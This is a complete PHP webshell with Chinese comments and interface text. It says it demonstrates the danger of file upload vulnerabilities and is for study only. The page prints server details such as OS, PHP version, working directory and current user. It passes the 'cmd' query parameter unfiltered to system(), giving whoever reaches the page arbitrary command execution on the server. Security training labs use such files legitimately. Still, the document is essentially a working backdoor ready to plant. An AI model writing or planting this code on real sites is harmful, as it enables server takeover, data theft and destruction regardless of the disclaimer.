<?php
/**
 * 基础PHP Webshell
 * 用途：演示文件上传漏洞的危害
 * 仅供学习使用
 */
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>PHP Webshell</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #2d2d2d;
            padding: 20px;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }
        h1 {
            color: #00ff00;
            text-align: center;
        }
        .info {
            background: #1e1e1e;
            padding: 10px;
            margin: 10px 0;
            border-left: 3px solid #00ff00;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            background: #1e1e1e;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #00ff00;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        pre {
            background: #1e1e1e;
            padding: 15px;
            overflow-x: auto;
            border: 1px solid #00ff00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>✅ Webshell 上传成功</h1>

        <div class="info">
            <strong>服务器信息：</strong><br>
            操作系统: <?php echo PHP_OS; ?><br>
            PHP版本: <?php echo PHP_VERSION; ?><br>
            当前目录: <?php echo getcwd(); ?><br>
            当前用户: <?php echo get_current_user(); ?>
        </div>

        <h3>执行系统命令：</h3>
        <form method="GET">
            <input type="text" name="cmd" placeholder="输入命令，例如: whoami, ls, dir" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" />
            <input type="submit" value="执行" />
        </form>

        <?php
        if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
            $cmd = $_GET['cmd'];
            echo "<h3>命令: " . htmlspecialchars($cmd) . "</h3>";
            echo "<pre>";
            system($cmd);
            echo "</pre>";
        }
        ?>

        <div class="info" style="margin-top: 20px; color: #ff6b6b;">
            <strong>⚠️ 警告：</strong><br>
            这是一个演示用的Webshell，仅用于安全学习。<br>
            请勿用于非法用途！
        </div>
    </div>
</body>
</html>
